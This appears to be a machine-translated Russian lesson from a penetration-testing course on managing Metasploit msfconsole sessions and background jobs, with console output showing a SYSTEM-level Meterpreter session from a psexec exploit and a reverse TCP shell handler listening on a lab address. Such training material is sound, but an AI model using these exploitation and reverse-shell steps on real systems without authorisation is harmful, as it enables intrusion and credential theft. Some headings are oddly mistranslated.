MSFconsole может управлять несколькими модулями одновременно. Это одна из многих причин, по которым она предоставляет пользователю такую ​​большую гибкость. Это достигается за счет использования `Sessions`, который создает выделенные интерфейсы управления для всех развернутых модулей.

После создания нескольких сессий мы можем переключаться между ними и связывать разные модули с одной из фоновых сессий для её выполнения или преобразования в задания. Обратите внимание, что после перевода сессии в фоновый режим она будет продолжать работать, и наше соединение с целевым хостом сохранится. Однако сессии могут завершиться с ошибкой во время выполнения полезной нагрузки, что приведет к разрыву канала связи.

---

## Использование сессий

При запуске любых доступных эксплойтов или вспомогательных модулей в msfconsole мы можем переводить сессию в фоновый режим, пока они поддерживают связь с целевым хостом. Это можно сделать либо нажатием `[CTRL] + [Z]`комбинации клавиш, либо вводом `background`команды в случае этапов Meterpreter. После этого появится сообщение с подтверждением. После принятия запроса мы вернёмся в командную строку msfconsole ( `msf6 >`) и сразу же сможем запустить другой модуль.

#### Список активных сессий

Мы можем использовать эту `sessions`команду для просмотра текущих активных сессий.

  Сессии

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

#### Взаимодействие с сессией

Вы можете использовать эту `sessions -i [no.]`команду для открытия определенной сессии.

  Сессии

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

Это особенно полезно, когда мы хотим запустить дополнительный модуль в уже эксплуатируемой системе с сформированным, стабильным каналом связи.

Это можно сделать, переведя в фоновый режим текущую сессию, которая формируется в результате успешного выполнения первой уязвимости, найдя второй модуль, который мы хотим запустить, и, если это возможно в зависимости от типа выбранного модуля, выбрав номер сессии, в которой должен быть запущен этот модуль. Это можно сделать из `show options`меню второго модуля.

Как правило, эти модули можно найти в `post`категории «Модули постэксплуатации». Основные типы модулей в этой категории включают в себя средства сбора учетных данных, подсказки локальных эксплойтов и сканеры внутренней сети.

## Работа

Например, если мы запускаем активный эксплойт на определенном порту и нам нужен этот порт для другого модуля, мы не можем просто завершить сессию с помощью команды ` `[CTRL] + [C]`.`. В этом случае мы увидим, что порт все еще занят, что повлияет на использование нового модуля. Поэтому вместо этого нам нужно использовать команду ` `jobs`.`, чтобы посмотреть на активные задачи, работающие в фоновом режиме, и завершить старые, чтобы освободить порт.

Другие типы задач внутри сессий также могут быть преобразованы в задания для бесперебойного выполнения в фоновом режиме, даже если сессия завершится или исчезнет.

#### Просмотр меню справки команды "Задания"

Чтобы просмотреть справку по этой команде, как и по другим, наберите `jobs -h`.

  Сессии

```shell-session
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

#### Просмотр меню справки по команде эксплойта

При запуске эксплойта мы можем запустить его как задание, набрав `exploit -j`. Согласно справочному меню команды `exploit`, добавление `-j`к нашей команде. Вместо просто `exploit`или `run`, запустит его в контексте задания.

  Сессии

```shell-session
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
	
<SNIP
```

#### Запуск эксплойта в фоновом режиме

  Сессии

```shell-session

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

#### Список вакансий для бегунов

Чтобы вывести список всех запущенных заданий, можно использовать `jobs -l`команду. Чтобы завершить конкретное задание, посмотрите его индекс и используйте команду `kill [index no.]`. Используйте `jobs -K`команду для завершения всех запущенных заданий.

  Сессии

```shell-session

msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

Далее мы займемся чрезвычайно мощной `Meterpreter`полезной нагрузкой.
